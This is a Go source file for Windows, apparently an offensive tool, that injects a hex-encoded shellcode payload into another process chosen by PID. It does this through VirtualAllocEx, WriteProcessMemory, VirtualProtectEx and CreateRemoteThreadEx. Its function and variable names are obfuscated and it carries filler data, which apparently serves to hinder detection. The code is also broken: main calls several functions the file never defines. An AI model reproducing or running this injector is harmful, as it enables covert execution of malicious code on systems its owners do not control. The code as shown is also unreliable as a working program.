package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var a3d2f5 = []int{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100}

func main() {
	a1b2c3 := flag.Bool("verbose", false, "")
	a2b3c4 := flag.Bool("debug", false, "")
	a3b4c5 := flag.Int("pid", 0, "Process ID to inject shellcode into")
	flag.Parse()

	a4b5c6()

	a5b6c7()

	a6b7c8()

	a7b8c9()

	a8b9ca()

	a9cacb()

	aacbdc()

	a9cdbd()
}

func a4b5c6() {
	a1d2e3, err1 := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if err1 != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", err1.Error()))
	}
	a10bfc := windows.NewLazySystemDLL("kernel32.dll")

	a11bfc := a10bfc.NewProc("VirtualAllocEx")
	a12bfc := a10bfc.NewProc("VirtualProtectEx")
	a13bfc := a10bfc.NewProc("WriteProcessMemory")
	a14bfc := a10bfc.NewProc("CreateRemoteThreadEx")

	if *a2b3c4 {
		fmt.Println(fmt.Sprintf("[DEBUG]Getting a handle to Process ID (PID) %d...", *a3b4c5))
	}
	a15bfc, err2 := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*a3b4c5))

	if err2 != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", err2.Error()))
	}
	if *a1b2c3 {
		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *a3b4c5))
	}

	if *a2b3c4 {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", *a3b4c5))
	}
	a16bfc, _, err3 := a11bfc.Call(uintptr(a15bfc), 0, uintptr(len(a1d2e3)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if err3 != nil && err3.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err3.Error()))
	}

	if a16bfc == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *a1b2c3 {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", *a3b4c5))
	}

	if *a2b3c4 {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", *a3b4c5))
	}
	_, _, err4 := a13bfc.Call(uintptr(a15bfc), a16bfc, (uintptr)(unsafe.Pointer(&a1d2e3[0])), uintptr(len(a1d2e3)))

	if err4 != nil && err4.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", err4.Error()))
	}
	if *a1b2c3 {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", *a3b4c5))
	}

	if *a2b3c4 {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", *a3b4c5))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, err5 := a12bfc.Call(uintptr(a15bfc), a16bfc, uintptr(len(a1d2e3)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err5 != nil && err5.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", err5.Error()))
	}
	if *a1b2c3 {
		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *a3b4c5))
	}

	if *a2b3c4 {
		fmt.Println(fmt.Sprintf("[DEBUG]Call CreateRemoteThreadEx on PID %d...", *a3b4c5))
	}
	_, _, err6 := a14bfc.Call(uintptr(a15bfc), 0, 0, a16bfc, 0, 0, 0)
	if err6 != nil && err6.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", err6.Error()))
	}
	if *a1b2c3 {
		fmt.Println(fmt.Sprintf("[+]Successfully create a remote thread in PID %d", *a3b4c5))
	}

	if *a2b3c4 {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CloseHandle on PID %d...", *a3b4c5))
	}
	err7 := windows.CloseHandle(a15bfc)
	if err7 != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", err7.Error()))
	}
	if *a1b2c3 {
		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *a3b4c5))
	}
}